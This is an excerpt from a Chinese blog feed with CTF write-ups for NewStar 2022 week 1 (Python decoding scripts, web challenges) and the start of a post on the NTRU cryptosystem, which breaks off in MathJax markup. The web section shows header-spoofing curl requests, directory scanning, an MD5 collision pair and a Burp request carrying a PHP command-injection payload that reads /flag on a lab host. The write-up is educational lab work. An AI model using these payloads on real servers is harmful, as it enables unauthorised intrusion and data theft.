0x7A, 0x75, 0x73, 63, 0x62]</span><br><span class="line"></span><br><span class="line">flag_ = &quot;&quot;</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag_ += chr(flag[i] ^ i)</span><br><span class="line">print(flag_)</span><br><span class="line">#flag&#123;S0meth1ng_run_bef0re_main!&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="pyre">Pyre</span></h3><ul><li>exe to pyc: https://github.com/extremecoders-re/pyinstxtractor</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py pyre.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用010editor打开extracted文件夹下pyre和struct。将struct第一行复制到pyre中，保存pyre为pyre.pyc。</p><p><img src="1667037496052.png"></p><p><img src="1667037519263.png"></p><ul><li>pyc to py: <code>pip install uncompyle6</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 pyre.pyc &gt; pyre.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后面的代码非常容易理解了，直接上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line">dics = &#123;&#125;</span><br><span class="line"></span><br><span class="line">encode = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">dics[table[i]] = encode[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">flag += dics[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;PYRE_1S_S0_FUN!!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="easyre">EasyRe</span></h3><p><img src="1667037903600.png"></p><p>找到dll中的encode函数，用ida进dll以后发现是encode_0函数，发现是base64。base64返回值做了一个异或加密，异或加密的str为‘Reverse’：</p><p><img src="1667038032200.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc =   [    <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x3C</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x1E</span>, <span class="number">0x3D</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, </span><br><span class="line">    <span class="number">0x3B</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x15</span>, <span class="number">0x28</span>, <span class="number">0x05</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x39</span>, <span class="number">0x09</span>, <span class="number">0x31</span>, <span class="number">0x56</span>, <span class="number">0x24</span>, <span class="number">0x1C</span>, </span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x24</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x2C</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x4B</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Reverse&#x27;</span></span><br><span class="line">c = <span class="built_in">list</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">base = [enc[i] ^ c[i % <span class="built_in">len</span>(c)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(base))</span><br><span class="line">base = <span class="built_in">bytes</span>(base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = base64.b64decode(base.decode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Base64_1s_1nterestr1ng!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="艾克体悟题">艾克体悟题</span></h3><p>我的安卓题做的不好，而且我比较懒= =开安卓模拟器需要把windows各种虚拟机关掉，我心爱的wsl2用不了实在是不好受= =还是看其他师傅写好的wp吧：https://www.anyiblog.top/2022/09/25/20220925/</p><h2><span id="web">Web</span></h2><h3><span id="http">HTTP</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux的curl语句，wsl2中做题记录,wsl2会自动加上&quot;\&quot;，不用管：</span></span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/</span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1</span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d <span class="string">&#x27;key=ctfisgood&#x27;</span></span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d <span class="string">&#x27;key=ctfisgood&#x27;</span> -H <span class="string">&#x27;cookie:user=admin&#x27;</span></span><br><span class="line"><span class="comment">#flag&#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="headheader">Head?Header!</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -v</span><br><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -v</span><br><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -H &#x27;X-Forwarded-For:127.0.0.1&#x27; -v</span><br><span class="line">#flag&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="我真的会谢">我真的会谢</span></h3><p>题目提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag has three part, qsdz hid them in different files.</span><br><span class="line">By the way, these files are sensitive.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在不同的文件里面，那么我么需要这些文件。dirsearch不能直接扫描buu的题目了，但其实延迟的参数就可以了。我的环境是wsl的kali：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://e4e77030-f04f-4879-835d-1d3e838f7007.node4.buuoj.cn:81/ -s 5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="1667047014556.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://84bb312a-45f4-422d-a658-41aeacc1b243.node4.buuoj.cn:81/.index.php.swp</span><br><span class="line">vim .index.php.swp</span><br><span class="line">#part_two</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外两个在robots.txt和www.zip里面。</p><h3><span id="notphp">NotPHP</span></h3><p>第一步，php伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,V2VsY29tZSB0byBDVEY=</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二步，利用md5的碰撞，两个字符串不一样但是加密相等。</p><p>https://blog.csdn.net/qq_64201116/article/details/126493091里面提供了一个字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第三步，num可以在结尾添加%00绕过。</p><p>第四步，cmd用%0a换行符绕过#。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=%0asystem(&#x27;cat%20/flag&#x27;); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuite包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;cmd=%0asystem(&#x27;cat%20/flag&#x27;); HTTP/1.1</span><br><span class="line">Host: d384d440-c395-4839-a541-026d7937b84d.node4.buuoj.cn:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">num=2077%00</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="word-for-you">Word-For-You</span></h3><p>直接用sqlmap了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用&#x27; or 1=1#试了一下就都出来了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="1667052387343.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;newstar-2022-week1&quot;&gt;Newstar 2022 |week1&lt;/span&gt;&lt;/h1&gt;
&lt;p&gt;一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写</summary>
      
    
    
    
    <category term="match" scheme="https://feverhu.github.io/categories/match/"/>
    
    
    <category term="RSA" scheme="https://feverhu.github.io/tags/RSA/"/>
    
    <category term="php" scheme="https://feverhu.github.io/tags/php/"/>
    
    <category term="python" scheme="https://feverhu.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>NTRU</title>
    <link href="https://feverhu.github.io/2022/09/16/NTRU/"/>
    <id>https://feverhu.github.io/2022/09/16/NTRU/</id>
    <published>2022-09-16T12:56:51.000Z</published>
    <updated>2022-10-29T14:59:59.202Z</updated>
    
    <content type="html"><![CDATA[<p>原理等来自相关链接：<a href="https://blog.csdn.net/sinat_36742186/article/details/83689529">NTRU-密码学</a>|<a href="https://www.cnblogs.com/xdyixia/p/12597290.html">NTRU算法</a>|<a href="https://en.wikipedia.org/wiki/NTRUEncrypt">wiki-NTRUEncrypt</a></p><!-- toc --><ul><li><a href="#简介">简介</a></li><li><a href="#初始化生成和公钥">初始化生成和公钥</a></li><li><a href="#encryption">Encryption</a></li><li><a href="#decryption">Decryption</a></li><li><a href="#dasctf-2022-july-esayntru">Dasctf 2022 July — esayNTRU</a><ul><li><a href="#题目">题目</a></li><li><a href="#解题思路">解题思路</a></li></ul></li><li><a href="#ntrursa">NTRUrsa</a><ul><li><a href="#题目-1">题目</a></li><li><a href="#题解">题解</a></li></ul></li><li><a href="#wiki-ntruencrypt-截图">wiki-NTRUEncrypt 截图</a></li></ul><!-- tocstop --><h2><span id="简介">简介</span></h2><p><strong>算法流程如下： </strong></p><p><img src="1662298171806.png"></p><h2><span id="初始化生成和公钥">初始化生成和公钥</span></h2><p><strong>初始化(N, p , q, d)</strong></p><p>N：次数参数，为正整数。经典取值为素数n=251。</p><p>q：大模数，为正整数。经典取值为2的幂q=256。</p><p>p：小模数，为小的奇素数或多项式。经典取值为素数p=3。</p><p>d：用来限制非0系数的个数，为整数。当n=251时，d=72。</p><p><strong>NTRU原始方案的一个说明： </strong>中心化处理，即模q运算或模p运算的结果以0为中心。比如模3运算的结果属于{-1，0，1}而不是{0，1，2}，模256运算的结果属于{-127，-126，…，128}而不是{0，1…，255}。这样的中心化处理在代数上没有任何不同，但使得尺寸变小了。环<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.658ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 4711 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"/></g><g data-mml-node="mi" transform="translate(723,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mo" transform="translate(1183,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(1461,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(2033,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2311,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mi" transform="translate(2811,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(3361,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3750,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(4322,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span>和环<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.756ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 4754 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"/></g><g data-mml-node="mi" transform="translate(723,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(1226,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(1504,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(2076,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2354,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mi" transform="translate(2854,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(3404,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3793,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(4365,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span>都经过这样的中心化处理。</p><p>此篇不做。</p><p><strong>生成公钥： </strong></p><p>生成两个次数为N - 1的多项式<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.695ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 4727 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1900,0)"><g data-mml-node="mo"><text data-variant="normal" 